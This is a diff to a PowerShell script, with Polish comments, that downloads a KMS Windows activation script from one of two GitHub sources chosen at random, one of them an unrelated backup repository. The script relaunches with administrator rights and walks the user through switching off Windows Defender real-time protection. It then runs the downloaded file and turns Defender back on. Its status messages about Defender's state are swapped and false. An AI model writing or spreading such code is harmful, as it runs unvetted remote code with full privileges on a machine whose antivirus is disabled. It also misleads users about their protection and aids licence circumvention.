@@ -1,14 +1,86 @@
-# Skrypt zapisujący KMS_VL_ALL_AIO.cmd do pliku i uruchamiający go jako administrator
+# Skrypt zapisujący KMS_VL_ALL_AIO.cmd do pliku i uruchamiający go jako administrator w tym samym oknie
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$URLs = @(
+    'https://github.com/abbodi1406/KMS_VL_ALL_AIO/raw/refs/heads/master/KMS_VL_ALL_AIO.cmd',
+    'https://github.com/testmina77/testmina77.github.io/raw/refs/heads/main/ACTIVATOR_BACKUP.cmd'
+)
 
-# Zawartość pliku .cmd, zamiast pobierania z internetu
-$cmdContent = @"
+foreach ($URL in $URLs | Sort-Object { Get-Random }) {
+    try { $cmdContent = Invoke-WebRequest -Uri $URL -UseBasicParsing; break } catch {}
+}
+if (-not $cmdContent) {
+    Check3rdAV
+    Write-Host "Failed to download activator from repositories! Quitting..."
+    return
+}
 
-"@
+function Disable-Defender {
+	Write-Host "Windows defender is going to block this script from working."
+	Write-Host "Windows defender needs to be disabled for the time of activation."
+	
+	# Check if the command matches the expected format
+	# Loop until the correct command is entered
+	while ($true) {
+		# Prompt the user for input
+		$command = Read-Host "You need to rewrite this to disable Windows Defender: 'Set-MpPreference -DisableRealtimeMonitoring $true'"
+
+		# Check if the command matches the expected format
+		if ($command -eq "Set-MpPreference -DisableRealtimeMonitoring $true") {
+			Write-Host "Rewrite successful! Disabling Windows Defender..."
+			
+			# Execute the rewritten command
+			Invoke-Expression $command
+			break  # Exit the loop once the correct command is executed
+		} else {
+			Write-Host "Incorrect input. Please try again."
+		}
+	}
+
+    Write-Host "Windows Defender real-time protection is now enabled."
+}
+
+function Enable-Defender {
+	while ($true) {
+		# Prompt the user for input
+		$command = Read-Host "You need to rewrite this to disable Windows Defender: 'Set-MpPreference -DisableRealtimeMonitoring $false'"
+
+		# Check if the command matches the expected format
+		if ($command -eq "Set-MpPreference -DisableRealtimeMonitoring $false") {
+			Write-Host "Rewrite successful! Disabling Windows Defender..."
+			
+			# Execute the rewritten command
+			Invoke-Expression $command
+			break  # Exit the loop once the correct command is executed
+		} else {
+			Write-Host "Incorrect input. Please try again."
+		}
+	}
+    Write-Host "Windows Defender real-time protection is now disabled."
+}
 
 # Funkcja do sprawdzania, czy skrypt jest uruchomiony jako administrator
 function Test-Admin {
     $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
     return $isAdmin
+}
+
+# Funkcja do sprawdzania zainstalowanych antywirusów
+function Check3rdAV {
+    $avList = Get-CimInstance -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Where-Object { $_.displayName -notlike '*windows*' } | Select-Object -ExpandProperty displayName
+    if ($avList) {
+        Write-Host '3rd party Antivirus might be blocking the script - ' -ForegroundColor White -BackgroundColor Blue -NoNewline
+        Write-Host " $($avList -join ', ')" -ForegroundColor DarkRed -BackgroundColor White
+    }
+}
+
+# Funkcja do sprawdzania istnienia pliku
+function CheckFile { 
+    param ([string]$FilePath) 
+    if (-not (Test-Path $FilePath)) { 
+        Check3rdAV
+        Write-Host "Failed to create file in temp folder, aborting!"
+        throw 
+    } 
 }
 
 # Jeśli skrypt nie jest uruchomiony jako administrator, uruchomić ponownie z uprawnieniami administratora
@@ -18,15 +90,19 @@ if (-not (Test-Admin)) {
     Start-Process powershell -ArgumentList "-Command $argList" -Verb RunAs
     return
 }
+Disable-Defender
 
 # Tworzenie tymczasowego pliku .cmd
 $rand = [Guid]::NewGuid().Guid
 $FilePath = "$env:SystemRoot\Temp\ACTIVATOR_$rand.cmd"
 Set-Content -Path $FilePath -Value $cmdContent
 
-# Uruchomienie pliku .cmd jako administrator
-$env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
-Start-Process -FilePath $env:ComSpec -ArgumentList "/c """"$FilePath"" $args""" -Wait
+# Sprawdzanie, czy plik został zapisany poprawnie
+CheckFile $FilePath
 
+# Uruchomienie pliku .cmd w tym samym oknie PowerShell (bez otwierania nowego okna)
+$process = Start-Process -FilePath "$env:SystemRoot\system32\cmd.exe" -ArgumentList "/c $FilePath" -PassThru -Wait -NoNewWindow
+
+Enable-Defender
 # Usunięcie pliku po wykonaniu
 Remove-Item $FilePath
